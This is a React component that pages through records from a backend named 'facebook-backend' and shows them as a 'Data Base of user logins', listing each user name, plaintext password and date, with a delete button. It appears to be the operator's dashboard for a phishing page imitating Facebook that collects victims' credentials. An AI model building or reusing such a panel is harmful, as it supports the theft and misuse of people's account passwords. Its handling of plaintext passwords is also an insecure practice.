import React, {useEffect, useState} from 'react'
import axios from "axios";
import {Button, Card, Container} from "react-bootstrap";
import ReactLoading from 'react-loading';

export default function Database({spin, color}) {
    const [data, setData] = useState([])
    const [TotalData, setTotalData] = useState(0)
    const [pages, setPages] = useState(0)
    const [isLoading, setIsLoading] = useState(true)


    useEffect(() => {
        axios.get(`https://facebook-backend-two.vercel.app/read?p=${pages}`)
            .then((res) => {
                setData(res.data)
                setIsLoading(false)
            })
            .catch(err => console.log(err))

    }, [pages])

    useEffect(() => {
        axios.get(`https://facebook-backend-two.vercel.app/total`)
            .then((res) => setTotalData(res.data))
            .catch(err => console.log(err))
    }, [])


    function Delete(_id) {
        axios.delete(`https://fbackend.onrender.com/delete/${_id}`)
            .then(() => {
                window.location.reload()
            })
    }

    return (
        <div>
            {isLoading ?
                <div className="spinner"><ReactLoading type={"spin"} color={"blue"} width={'5rem'}/>
                </div>
                :
                <>
                    <Container className="text-center">
                        <h2>Data Base of user logins</h2> <span
                        className="text-warning fw-bold">Total logins: {TotalData}</span>
                    </Container>
                </>
            }

            {data.map((item, index) => {
                return (
                    <div key={index}>
                        <Card className="my-card rounded-0 shadow" style={{width: '50vh', height: '9rem'}}>
                            <Card.Body>
                                <button
                                    onClick={()=>Delete(item._id)}
                                    className="deleteBtn">X
                                </button>
                                <Card.Text>
                                    <span className="text-info fw-bold">User Name: </span>{item.user_name}
                                </Card.Text>

                                <Card.Text>
                                    <span className="text-info fw-bold">Password: </span> {item.password}
                                </Card.Text>

                                <Card.Text>
                                    <span className="text-info fw-bold">Date: </span> {item.creatAt}
                                </Card.Text>
                            </Card.Body>
                        </Card>
                    </div>
                )
            })}

            <Container className="mt-2 d-flex justify-content-between">
                <Button
                    hidden={isLoading}
                    disabled={pages === 0 && true}
                    onClick={() => setPages(pages - 1)}
                    variant="danger">
                    BACK
                </Button>

                <h6 hidden={isLoading}>Page: {pages + 1}</h6>

                <Button
                    hidden={isLoading}
                    disabled={data.length === 0 && true}
                    onClick={() => setPages(pages + 1)}
                    variant="danger">
                    NEXT
                </Button>
            </Container>

        </div>
    )
}